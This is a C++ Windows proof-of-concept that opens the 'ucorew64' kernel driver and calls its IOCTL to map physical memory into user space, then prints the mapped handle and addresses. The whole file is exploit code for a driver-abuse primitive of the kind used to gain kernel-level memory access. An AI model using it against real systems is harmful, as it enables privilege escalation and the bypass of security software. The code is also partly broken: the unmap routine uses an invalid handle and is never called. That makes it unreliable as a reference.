#include <iostream>
#include <Windows.h>
//#include <ntstatus.h>

#define IOCTL_MapPhysicalMemoryToLinearSpace 0xFA002EE8
#define IOCTL_UnmapPhysicalMemory 0xFA002EEC
#define STATUS_SUCCESS 0x0

typedef struct struct_buffer
{
    void* SectionHandle;
    DWORD offset;
    unsigned int BusAddress;
    PVOID PhysicalBaseAddress;
} struct_buffer;

typedef struct Phys32Struct
{
    HANDLE PhysicalMemoryHandle;
    SIZE_T dwPhysMemSizeInBytes;
    PVOID pvPhysAddress;
    PVOID pvPhysMemLin;
} Phys32Struct;
//source: https://github.com/ellysh/InpOut32/blob/fa28b483c4ab9e18f6d437fad390022181aa37f9/driver/hwinterfacedrv.h#L15
NTSTATUS UnmapPhysicalMemory(Phys32Struct& phys32) {
    HANDLE device2 = INVALID_HANDLE_VALUE;
    NTSTATUS status = FALSE;
    DWORD bytesReturned2 = 0;


    printf("[ ] Calling UnmapPhysicalMemory 0x%X\n", UnmapPhysicalMemory);
    status = DeviceIoControl(device2, IOCTL_UnmapPhysicalMemory, &phys32,
        sizeof(phys32), NULL, 0, &bytesReturned2, (LPOVERLAPPED)NULL);
    if (status == FALSE) {
        printf("[!] UnmapPhysicalMemory failed with %X\n", status);
        return EXIT_FAILURE;
        //https://github.com/ellysh/InpOut32/blob/master/driver/hwinterfacedrv.c
    }
    printf("[*] UnmapPhysicalMemory 0x%X called successfully\n", IOCTL_UnmapPhysicalMemory);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", bytesReturned2, bytesReturned2);

    return status;
}

int main(char argc, char** argv)
{
    HANDLE device = INVALID_HANDLE_VALUE;
    NTSTATUS status = FALSE;
    DWORD bytesReturned = 0;
    Phys32Struct phys32Struct = { 0 };


    device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

    if (device == INVALID_HANDLE_VALUE)
    {
        printf("> Could not open device: 0x%X\n", GetLastError());
        return FALSE;
    }

    printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
    status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &phys32Struct, sizeof(phys32Struct), &phys32Struct, sizeof(phys32Struct), &bytesReturned, (LPOVERLAPPED)NULL);
    if (status == FALSE) {
        printf("[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
        return EXIT_FAILURE;
    }
    printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", phys32Struct, bytesReturned);
    printf("phys32Struct.dwPhysMemSizeInBytes: %X\n", phys32Struct.dwPhysMemSizeInBytes);
    printf("phys32Struct.PhysicalMemoryHandle: %X\n", phys32Struct.PhysicalMemoryHandle);
    printf("phys32Struct.pvPhysAddress: %X\n", phys32Struct.pvPhysAddress);
    printf("phys32Struct.pvPhysMemLin: %X\n", phys32Struct.pvPhysMemLin);


    system("pause");

    CloseHandle(phys32Struct.PhysicalMemoryHandle);
    CloseHandle(device);
    return EXIT_SUCCESS;
}